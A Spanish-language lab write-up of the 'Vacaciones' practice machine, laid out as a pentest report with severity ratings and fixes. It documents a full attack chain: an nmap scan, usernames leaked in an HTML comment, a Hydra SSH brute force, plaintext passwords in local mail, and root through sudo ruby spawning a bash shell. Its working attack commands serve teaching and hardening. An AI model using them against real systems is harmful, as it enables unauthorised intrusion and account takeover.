# 🛡️ Writeup — Máquina "Vacaciones"

**IP objetivo:** `172.17.0.2`
**Severidad global:** 🔴 Crítica
**Servicios expuestos:** `22 (SSH)`, `80 (HTTP)`

---

## 📌 Resumen Ejecutivo

> [!NOTE]
> Compromiso total del sistema (acceso root) mediante una cadena de vulnerabilidades: exposición de información sensible en comentarios HTML, contraseñas débiles, credenciales almacenadas en texto plano, y configuración insegura de privilegios `sudo`.

---

## 🔍 1. Reconocimiento

```bash
nmap -p- --open -sS -sC -sV -T4 -n -vvv -O -Pn 172.17.0.2
```

| Puerto | Estado | Servicio | Versión |
|---|---|---|---|
| 22/tcp | 🔓 Abierto | SSH | OpenSSH 7.6p1 Ubuntu |
| 80/tcp | 🔓 Abierto | HTTP | Apache 2.4.29 |

---

## 🚩 Hallazgos

### 🟡 H1: Fuga de información en comentarios HTML

**Severidad:** Baja (habilitadora de los siguientes hallazgos)

**Resumen:** El código fuente de la web contiene un comentario HTML con información interna que revela la existencia de usuarios válidos del sistema.

**Detalle**
```html
<!-- De: Juan Para: Camilo, te he dejado un correo, es importante... -->
```
Este comentario sugiere la existencia de los usuarios `juan` y `camilo` en el sistema.

**Impacto:** Facilita el ataque de fuerza bruta dirigida (H2) al reducir el espacio de usuarios a probar.

**Recomendación:** Eliminar comentarios sensibles en producción; revisar código antes de despliegue.

---

### 🟠 H2: Fuerza bruta SSH exitosa (`camilo`)

**Severidad:** Alta

**Resumen:** El servicio SSH acepta autenticación por contraseña sin protección contra fuerza bruta, y la cuenta `camilo` (identificada en H1) usa una contraseña presente en `rockyou.txt`.

**PoC**
```bash
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```
Credenciales obtenidas: `camilo` / `password1`


```bash
ssh camilo@172.17.0.2
whoami
# camilo
```


**Impacto:** Acceso inicial al sistema.

**Recomendación:** Deshabilitar autenticación por contraseña en SSH; usar claves.

---

### 🟡 H3: Credenciales en texto plano en correo local (movimiento lateral)

**Severidad:** Media

**Resumen:** El correo local del usuario `camilo` contiene en texto plano la contraseña de otro usuario del sistema (`juan`), permitiendo movimiento lateral sin necesidad de explotación adicional.

**Detalle / PoC**
```bash
cat /var/mail/camilo/correo.txt
```
```
Hola Camilo...
aquí tienes la contraseña: 2k84dicb
```
Nueva credencial descubierta: `juan` / `2k84dicb`

```bash
ssh juan@172.17.0.2
```

**Impacto:** Compromiso de una segunda cuenta del sistema mediante almacenamiento inseguro de credenciales.

**Recomendación:** Evitar almacenamiento de credenciales en texto plano; rotación periódica de contraseñas.

---

### 🔴 H4: Escalada de privilegios vía `sudo` sobre Ruby (NOPASSWD)

**Severidad:** Crítica

**Resumen:** El usuario `juan` puede ejecutar el intérprete Ruby como root sin contraseña, permitiendo obtener una shell root directa (técnica GTFOBins).

**Detalle / Causa raíz**
```bash
sudo -l
```
```
(ALL) NOPASSWD: /usr/bin/ruby
```

**PoC**
```bash
sudo ruby -e 'exec "/bin/bash"'
whoami
# root
```


**Impacto:** Compromiso total del sistema.

**Recomendación:** Eliminar `NOPASSWD` sobre intérpretes de propósito general; restringir ejecución de binarios peligrosos en `/etc/sudoers`.

---

## 🔗 Cadena de ataque

```text
Fuga de información (HTML) → identificación de usuarios → Fuerza bruta SSH (camilo) →
exposición de credenciales en correo → movimiento lateral (juan) → sudo ruby NOPASSWD → root
```

---

## 🛡️ Recomendaciones generales

- **Hardening de SSH:** deshabilitar autenticación por contraseña, implementar claves.
- **Gestión de credenciales:** evitar texto plano, rotación periódica.
- **Control de privilegios:** mínimo privilegio, restringir binarios peligrosos en sudoers.
- **Seguridad en desarrollo:** eliminar comentarios sensibles, revisar código antes de despliegue.
- **Monitorización:** `fail2ban`, auditoría continua de logs.

---

## 🧾 Conclusión

> [!NOTE]
> El sistema presenta múltiples fallos críticos encadenados que permiten su compromiso total. Este laboratorio demuestra cómo errores básicos de configuración pueden derivar en una intrusión completa.
